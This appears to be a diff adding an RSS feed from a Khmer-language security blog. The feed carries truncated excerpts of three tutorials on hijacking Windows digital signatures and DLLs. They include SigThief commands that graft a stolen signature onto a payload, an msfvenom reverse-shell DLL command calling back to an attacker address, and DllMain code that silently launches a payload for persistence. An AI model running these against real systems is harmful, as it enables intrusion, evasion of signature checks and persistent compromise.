@@ -1,0 +1,160 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>hijacking on ThikLab - CyberSec</title>
+    <link>https://thiklab.com/en/tags/hijacking/</link>
+    <description>Recent content in hijacking on ThikLab - CyberSec</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
+    <webMaster>thiklife403@gmail.com (Thik)</webMaster>
+    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2023 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
+    <lastBuildDate>Sat, 08 Jul 2023 16:22:34 +0700</lastBuildDate>
+    
+        <atom:link href="https://thiklab.com/en/tags/hijacking/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>Hijacking Digital Signatures</title>
+        <link>https://thiklab.com/en/posts/hijacking-digital-signatures/</link>
+        <pubDate>Sat, 08 Jul 2023 16:22:34 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Sat, 08 Jul 2023 16:22:34 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/hijacking-digital-signatures/</guid>
+        <description>មានវិធីសាស្ត្រជាច្រើនក្នុងការលួចយក ឬ ចម្លងយក Digital Signatures ចេញពីឯកសារពិតប្រាកដណាមួយនៅក្នុងប្រព័ន្ធវីនដូ ។ តែថ្ងៃនេះយើងនឹងមកមើលឧបករណ៍មួយដែលអាចជួយឲ្យមានភាពងាយស្រួលក្នុងការលួចយក Signatures ដែលមាននៅក្នុងឯកសារ Binary រួចដាក់បញ្ជូលទៅក្នុង Payload បានយ៉ាងឆាប់រហ័ស ។
+Digital Signatures Hijacking Tools SigThif ងាយៗជាមួយ SigThif ក្នុងការលួចយក Signatures ពីកម្មវិធីជាច្រើននៅក្នងវីនដូ ។
+វិធីប្រើ 1 2 3 4 5 6 7 8 9 10 11 12 13 14  git clone https://github.com/secretsquirrel/SigThief.git cd SigThief // លួចយក Signature ចេញពីកម្មវិធីរួចដាក់ចូលទៅក្នុង Payload python3 sigthief.py -i putty.exe -t payload.exe -o malsign.exe // យក Signature ចេញ និងរក្សាទុកប្រើពេលក្រោយ python3 sigthief.py -i putty.exe -r // យក Signature ដែលរក្សាទុកមកប្រើប្រាស់វិញ python3 sigthief.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature3/ca.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>hijacking</category>
+            
+          
+            
+              <category>digiral-signatures</category>
+            
+          
+        
+        
+          
+            
+              <category>CA</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>DLL Hijacking Attack 0x01</title>
+        <link>https://thiklab.com/en/posts/dll-hijacking-0x01/</link>
+        <pubDate>Fri, 07 Jul 2023 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Fri, 07 Jul 2023 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/dll-hijacking-0x01/</guid>
+        <description>DLL hijacking ឬដែលគេត្រូវបានស្គាល់ថាជា DLL preloading ឬ DLL side-loading គឺជាវិធីសាស្ត្រវាយប្រហារដោយធ្វើការបោកបញ្ឆោតរាល់កម្មវិធី (Software) ដែលមាននៅក្នុងប្រព័ន្ធប្រតិបត្តិការវីនដូទាំងអស់ក្នុងការព្យាយាមបើកដំណើរការ DLL ដែលមានបង្កប់នូវមេរោគជាជាងបើកដំណើរការ DLL មែនទែននៃកម្មវិធី ។
+Finding Missing DLLs ដើម្បីស្វែងរករាល់ DLL ដែលបានបាត់នៅក្នុងប្រព័ន្ធប្រតិបត្តិការវីនដូយើងអាចប្រើប្រាស់កម្មវិធី Procmon ហើយធ្វើការ Filter លក្ខណ្ឌទាំងពីរដូចរូបខាងក្រោម៖
+ក្រោយពីយើងធ្វើការដាក់បញ្ជូល Filter ទាំងពីររួចរាល់ សូមចុច Apply នោះកម្មវិធីនឹងធ្វើការច្រោះចេញនូវរាល់ DLLs ទាំងឡាយណាដែលត្រូវការបើកដំណើរការ ប៉ុន្តែវាមិនត្រូវបានរកឃើញនៅក្នុងប្រព័ន្ធ ។
+ប្រសិនបើយើងចង់ធ្វើការ Filter ទៅលើកម្មវិធីណាមួយជាក់លាក់នោះយើងត្រូវបន្ថែមការកំណត់ Filter ដូចខាងក្រោម៖
+Exploation Path ដំបូងយើងត្រូវការ DLL Payload ដោយយើងអាចបង្កើតវាបានតាមរយៈ Framework ជាច្រើនដូចជា Metasploit / Cobalt Strike​ / DCRat ។ល។ យើងនឹងបង្កើតវាដោយប្រើប្រាស់ MSFvenom ដែលជា Standalone Payload Generator ដូចខាងក្រោម៖
+1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f dll &amp;gt; payload.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature3/dll.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>dll</category>
+            
+          
+            
+              <category>hijacking</category>
+            
+          
+        
+        
+          
+            
+              <category>DLL Hijacking</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>DLL Hijacking - Persistence Method</title>
+        <link>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</link>
+        <pubDate>Tue, 06 Dec 2022 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Tue, 06 Dec 2022 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</guid>
+        <description>C - Execute Command Prompt ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include &amp;lt;windows.h&amp;gt;using namespace std; void exec() { WinExec(&amp;#34;cmd.exe /c c:\\programdata\\putty.exe&amp;#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LYVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec(); break; } return TRUE; }  
+យោងតាម៖ dllmain
+DLL Build ចូលទៅកាន់ផ្ទាំង Terminal ក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>dll</category>
+            
+          
+            
+              <category>persistence</category>
+            
+          
+            
+              <category>hijacking</category>
+            
+          
+        
+        
+          
+            
+              <category>DLL Hijacking</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
